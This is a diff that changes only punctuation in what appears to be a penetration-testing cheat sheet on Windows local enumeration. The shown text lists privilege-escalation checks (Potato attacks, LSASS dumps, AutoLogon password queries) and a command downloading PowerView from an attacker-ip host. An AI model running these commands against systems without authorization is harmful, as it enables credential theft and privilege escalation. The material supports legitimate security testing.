@@ -1,13 +1,13 @@
 # Windows Local Enumeration
 
 !!! tip "Quick win order"
-    1. `whoami /priv` — SeImpersonatePrivilege → Potato attacks; SeBackup/SeRestore → shadow copy NTDS; SeDebug → LSASS dump
-    2. `net localgroup administrators` — already admin?
-    3. `cmdkey /list` and `dir /s *.config *.xml unattend*` — stored credentials everywhere
+    1. `whoami /priv`: SeImpersonatePrivilege → Potato attacks; SeBackup/SeRestore → shadow copy NTDS; SeDebug → LSASS dump
+    2. `net localgroup administrators`: already admin?
+    3. `cmdkey /list` and `dir /s *.config *.xml unattend*`, stored credentials everywhere
     4. AlwaysInstallElevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
-    5. AutoLogon: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` — look for DefaultPassword
+    5. AutoLogon: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`. Look for DefaultPassword
     6. Unquoted service paths and weak service permissions
-    7. Run `winpeas.exe` for a comprehensive sweep — cross-reference findings manually
+    7. Run `winpeas.exe` for a comprehensive sweep, cross-reference findings manually
 
 ---
 
@@ -114,7 +114,7 @@ quser /server:10.10.10.10
 
 ## ACL Enumeration (PowerView)
 
-PowerView is part of PowerSploit — must be imported first. The cmdlets below don't exist in stock PowerShell:
+PowerView is part of PowerSploit, must be imported first. The cmdlets below don't exist in stock PowerShell:
 
 ```powershell
 iwr -uri http://<attacker-ip>/PowerView.ps1 -OutFile PowerView.ps1
@@ -125,7 +125,7 @@ Get-DomainObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -lik
 ConvertFrom-SID S-1-5-21-1987370270-658905905-1781884369-1104
 ```
 
-For AD-wide ACL mapping, use BloodHound — don't try to do this manually beyond targeted checks.
+For AD-wide ACL mapping, use BloodHound, don't try to do this manually beyond targeted checks.
 
 ---
 
@@ -135,7 +135,7 @@ For AD-wide ACL mapping, use BloodHound — don't try to do this manually beyond
 schtasks /query /fo LIST /v | findstr /i "TaskName Next Run Time Task To Run Run As User"
 ```
 
-PowerShell — list tasks not running as `SYSTEM`/`LOCAL SERVICE` with writable task files:
+PowerShell, list tasks not running as `SYSTEM`/`LOCAL SERVICE` with writable task files:
 
 ```powershell
 Get-ScheduledTask | Where-Object { $_.Principal.UserId -notmatch 'SYSTEM|LOCAL|NETWORK' } | Select TaskName,TaskPath,@{n='Action';e={$_.Actions.Execute}}
